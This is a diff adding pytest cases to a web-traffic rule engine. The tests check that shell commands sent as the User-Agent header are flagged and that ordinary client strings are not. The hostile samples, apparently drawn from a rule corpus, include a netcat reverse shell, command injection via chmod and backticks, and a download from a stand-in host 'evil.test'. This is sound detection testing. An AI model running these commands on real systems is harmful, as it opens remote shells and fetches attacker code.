@@ -2092,6 +2092,54 @@ RCE_BENIGN: list[str] = [
 ]
 
 
+@pytest.mark.parametrize(
+    "user_agent",
+    [
+        # From the CRS corpus (family 932): the User-Agent is the command.
+        "ansible all -m ping",
+        "env --version",
+        "set -o history",
+        "chef-shell",
+        "visudo",
+        ";chmod 777 /tmp/x",
+        ";`cat<<<ifconfig`",
+        "a=nc&&$a -e /bin/sh 10.0.0.1 4444",
+        "http://evil.test/upload.php;lwp-download http://evil.test/x",
+    ],
+)
+def test_a_command_line_sent_as_the_user_agent_is_caught(
+    engine: RuleEngine, user_agent: str
+) -> None:
+    (labelled,) = engine.label_events([request("/", user_agent=user_agent)])
+
+    assert "shell_command_as_user_agent" in {label.rule_id for label in labelled.all_labels}
+
+
+@pytest.mark.parametrize(
+    "user_agent",
+    [
+        # Clients name themselves name/version, which is what keeps them out.
+        "curl/8.6.0",
+        "Wget/1.21.4 (linux-gnu)",
+        "python-requests/2.32.3",
+        "libwww-perl/6.72",
+        # Bare client names, and products whose names start with a command word.
+        "curl",
+        "Ruby",
+        "ID Scanner 2.0",
+        "Set-top box Android TV",
+        "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.5417; Pro)",
+        "Expanse, a Palo Alto Networks company, searches across the global IPv4 space",
+        "Mozilla/5.0 (Linux; Android 9; SH-04F) AppleWebKit/537.36",
+    ],
+)
+def test_ordinary_user_agents_are_not_command_lines(engine: RuleEngine, user_agent: str) -> None:
+    (labelled,) = engine.label_events([request("/", user_agent=user_agent)])
+
+    hostile = [label.rule_id for label in labelled.all_labels if label.category.is_hostile]
+    assert not hostile, f"{user_agent!r} was called hostile by {hostile}"
+
+
 #: PHP shapes the 2026-10-05 pass added. From the CRS corpus (family 933).
 PHP_INDIRECT_ATTACKS: list[tuple[str, str]] = [
     ("/get?x=(system)(ls);", "php_indirect_call"),
